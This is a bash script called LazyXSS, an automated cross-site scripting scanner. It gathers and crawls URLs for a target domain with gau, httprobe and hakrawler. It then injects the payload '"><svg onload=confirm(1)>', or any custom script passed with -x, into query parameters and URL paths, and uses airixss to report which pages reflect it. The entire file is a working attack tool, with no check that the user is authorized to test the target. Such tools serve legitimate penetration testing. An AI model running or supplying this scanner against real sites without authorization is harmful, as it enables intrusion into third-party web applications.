#!/bin/bash

export PATH="$PATH:~/.LazyXSS:~/.LazyXSS/airixss:~/.LazyXSS/httprobe:~/.LazyXSS/qsreplace:~/.LazyXSS/hakrawler"


# flags

while getopts a:t:p:x:h flag
do
    case "${flag}" in
        a) attack=${OPTARG};;
        t) target=${OPTARG};;
        p) ports=${OPTARG};;
        x) custom=${OPTARG};;
        h) help=${OPT};;
        *) echo "Invalid option: -$flag" ;;
    esac


done

trap ctrl_c INT


function rm_tmp () {

 if [ -f /tmp/probes.tmp ];then rm -f /tmp/probes.tmp;fi
 if [ -f /tmp/probes.tmp ];then rm -f /tmp/gau.tmp;fi
 if [ -f /tmp/url-path.tmp ];then rm -f /tmp/url-path.tmp;fi

}

function ctrl_c(){
 echo -e "\n\n\n${red}Made${end} in ${blue}Do${end}"
 rm_tmp
 exit 0
}

## VARS
probe_temp="/tmp/probes.tmp"
gau_temp="/tmp/gau.tmp"

if [ "$custom" ]
then
	xss_payload=$custom
	reflect=$custom
else 
xss_payload='"><svg onload=confirm(1)>'
reflect="confirm(1)"

fi


## Colors
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"


## banner

function ip () {
IP=$(curl -s ifconfig.me)
cntry=$(whois $IP|grep country|awk -F ":" '{print $2}'|tr -d ' ')

echo -e "\n${blue}Your IP is:${end} ${yellow}$IP${end} ${red}$cntry${end}"
}

ip 2>/dev/null

echo -e "${purple}

 ██▓    ▄▄▄      ▒███████▒▓██   ██▓▒██   ██▒  ██████   ██████ 
▓██▒   ▒████▄    ▒ ▒ ▒ ▄▀░ ▒██  ██▒▒▒ █ █ ▒░▒██    ▒ ▒██    ▒ 
▒██░   ▒██  ▀█▄  ░ ▒ ▄▀▒░   ▒██ ██░░░  █   ░░ ▓██▄   ░ ▓██▄   
▒██░   ░██▄▄▄▄██   ▄▀▒   ░  ░ ▐██▓░ ░ █ █ ▒   ▒   ██▒  ▒   ██▒
░██████▒▓█   ▓██▒▒███████▒  ░ ██▒▓░▒██▒ ▒██▒▒██████▒▒▒██████▒▒
░ ▒░▓  ░▒▒   ▓▒█░░▒▒ ▓░▒░▒   ██▒▒▒ ▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
░ ░ ▒  ░ ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▓██ ░▒░ ░░   ░▒ ░░ ░▒  ░ ░░ ░▒  ░ ░
  ░ ░    ░   ▒   ░ ░ ░ ░ ░ ▒ ▒ ░░   ░    ░  ░  ░  ░  ░  ░  ░  
    ░  ░     ░  ░  ░ ░     ░ ░      ░    ░        ░        ░  
                 ░         ░ ░                                

By Filiplain
${end}
"



## Help Panel

function help_panel () {



echo -e "

  -a)	  Set attack number (1,2,3,4):
          1) Try finding XSS in parameters on Given URL or list of URLs in a File.
          2) Try finding XSS in PATHs on Given URL or list of URLs in a File.
          3) Probe given domain or domains in a file, Crawls the alive URLs and then try to find possible XSS on Parameters.
          eg: -a 3
          4) Fetch URLs of target domain and try to find possible XSS on Parameters.
          eg: -a 4
        
  -t)     Set target giving a URL/domain or a list in a file depending on the attack type. 
 	  eg: -t ./url-list.txt
 	  eg: -t http://vulnpage.test
 	
 	
  -p)     [When using attack #3 only] Set ports to probe (defaults 80,443).
	  eg: -p 8000,8080,8085,10443

  -x)	  [OPTIONAL] Custom XSS Payload (Default: '\"><svg onload=confirm(1)>)'
          eg: -x '\"><sCrIpT>alert(1)<ScRiPt>'

  -h)	  Open this help panel

"

}

## URL encoding for XSS PAYLOAD

function url_encode() {
    echo "$xss_payload" \
    | sed \
        -e 's/%/%25/g' \
        -e 's/ /%20/g' \
        -e 's/!/%21/g' \
        -e 's/"/%22/g' \
        -e "s/'/%27/g" \
        -e 's/#/%23/g' \
        -e 's/(/%28/g' \
        -e 's/)/%29/g' \
        -e 's/+/%2b/g' \
        -e 's/,/%2c/g' \
        -e 's/-/%2d/g' \
        -e 's/:/%3a/g' \
        -e 's/;/%3b/g' \
        -e 's/?/%3f/g' \
        -e 's/@/%40/g' \
        -e 's/\$/%24/g' \
        -e 's/\&/%26/g' \
        -e 's/\*/%2a/g' \
        -e 's/\./%2e/g' \
        -e 's/\//%2f/g' \
        -e 's/\[/%5b/g' \
        -e 's/\\/%5c/g' \
        -e 's/\]/%5d/g' \
        -e 's/\^/%5e/g' \
        -e 's/_/%5f/g' \
        -e 's/`/%60/g' \
        -e 's/{/%7b/g' \
        -e 's/|/%7c/g' \
        -e 's/}/%7d/g' \
        -e 's/~/%7e/g'
}

payload2=$(echo $(url_encode))

## Format ports into httprobe
function set_ports () {
 for p in $(echo $ports|tr ',' '\n')
  do 
   echo "-p http:$p -p https:$p"|tr '\n' ' ' 
  done
}

function target_func () {
  if [ -e $target ]
  then
     cat $target |grep -iE 'http:|https:' >/dev/null && out=$(cat $target|awk -F[/:] '{print $4}') || out=$(cat $target)
    echo $out

  else
   echo $target|grep -iE 'http:|https:' >/dev/null && out=$(echo $target|awk -F[/:] '{print $4}') || out=$(echo $target)
   echo $out     
  fi

}

## Fetching all target URLs

function getallurls () {

gau $(target_func) > $gau_temp
echo -e "${yellow} $(wc -l /tmp/gau.tmp|cut -f 1 -d ' ') URLs Found${end}\n"
target=$gau_temp
echo -e "${blue}Finding XSS on fetched URLs${end}"
xss_find2
}

## probing with domais and ports
function probes () { 
  echo $(target_func)|tr ' ' '\n'|httprobe $(set_ports) -c 50 
 

}

## Check for valid URL in target 
function url_check () {

input=$(echo $(cat $target 2>/dev/null|| echo $target))
echo $input|tr ' ' '\n'|grep -iE 'http:|https:' >/dev/null 2>&1 && echo -n "true"


}

## Crawl for domains and subs pages
function crawlee () {

  for url in $(cat $probe_temp)
   do
    echo -e "\n\n${yellow}Saving Crawl results of${end} $url ${yellow}as${end} /tmp/$(echo $url|tr -d ':'|cut -d'/' -f3).tmp"
    echo $url | hakrawler -subs|grep $(echo $url|awk -F '.' '{ print $2"."$3}') > /tmp/$(echo "$url"|tr -d ':'|cut -d'/' -f3).tmp

   done
}

## finding XSS with Probes
function xss_find () { 
  for url_probe in $(cat $probe_temp)
    do
     
      echo -e "\n${yellow}Possible XSS for:${end} $url_probe\n"
      cat /tmp/$(echo $url_probe|tr -d ':'|cut -d'/' -f3).tmp|grep "="|qsreplace "$xss_payload" | airixss -payload "$reflect" | egrep -v 'Not'
    done
} 

## finding XSS With URLs given
function xss_find2 () {

if [ $(url_check) == "true" ];
then
 if [ -e $target ]
 then
   cat $target |grep "="|qsreplace "$xss_payload" | airixss -payload "$reflect" | egrep -v 'Not' 
 else
    echo $target |grep "="|qsreplace "$xss_payload" | airixss -payload "$reflect" | egrep -v 'Not' 
 fi
else
   echo -e "${red}\n\nPlease provide valid URLs for testing XSS or please use attack type #3${end}"
fi

} 

function path_xss () {

if [ $(url_check) == "true" ];
then
 if [ -e $target ]
   then
   urls=$(cat $target)
 else
   urls=$(echo $target)

 fi
 if [ $(echo $urls|tr ' ' '\n'|wc -l) -lt 2001 ];then
  echo -e "${yellow}\nWait ... The Lazy XSS is Generating the possible combinations of paths\n${end}"
   urls_filtered=$(echo "$urls"|awk -F '?' '{ print $1 }'|sort -u)
   for url in $(echo $urls_filtered|tr ' ' '\n')
   
   do
    input=$(echo $url|tr '/' '\n'|sed '1,3d')
    for w in $(seq 1 $( echo "$input" |wc -l));
    do
     word=$(echo $input|tr ' ' '\n'| sed "$w,$w!d")
     out=$(echo $url|sed "s/$word/$payload2/" 2>/dev/null)
     echo $out >> /tmp/url-path.tmp &
    done
   done
   echo -e "\n${yellow}It is Done${end}\n"
   echo -e "\n${yellow}\nLooking for Possible XSS on combinations...${end}"
   cat /tmp/url-path.tmp|airixss -payload "$reflect" | egrep -vE 'Not|not'
 else
   echo -e "${red}\nToo Many URLs (Max 2000), this attack type takes too much time... please use less or try using attack #1 ${end}"
 fi
else 
   echo -e "${red}\n\nPlease provide valid URLs for testing XSS or please use attack type #2${end}"
fi
}

if [ $1 == '-h' ];then
  help_panel
else
if [ $1 ];then 
 if [ $attack == "4" ]
  then
   echo -e "The attack type selected was ${red}#$attack${end}:\n"
   echo "Fetching all URLs of the target and then finding XSS on Parameters (=)"
    echo -e "\n${yellow}[This could take a lot of time depending on the target]${end}\n"
   getallurls

 elif [ $attack == "3" ]
  then
   echo -e "The attack type selected was ${red}#$attack${end}:\n"
   echo "Probing, Crawling and Testing for XSS on given domains"
   echo -e "\n${blue}Probing target with ports:${end} (Defaults 80,443) $(echo $ports|tr ',' ' ')\n"
   probes|tee $probe_temp
   echo -e "\n${blue}Crawling alive URLs:${end}"
   crawlee
   echo -e "\n${blue}Testing for Possible XSS on Parameters (=):${end}"
   xss_find


 elif [ $attack == "1" ]
  then
   echo -e "The attack type selected was ${red}#$attack${end}:\n"
   echo "Testing for XSS on given URL/URLs"
   echo -e "\n${blue}Testing for Possible XSS on Parameters (=):${end}"
   xss_find2

 elif [ $attack == "2" ]
  then
    echo -e "The attack type selected was ${red}#$attack${end}:\n"
    echo -e "\n${blue}Testing for Possible XSS on Paths (/< >/):${end}"
    path_xss
 
 
 else 

   echo "Invalid Attack Number"
   help_panel

 fi
 
else

 help_panel

fi

fi
echo -e "\n\n\n${red}Made${end} in ${blue}Do${end}"
rm_tmp
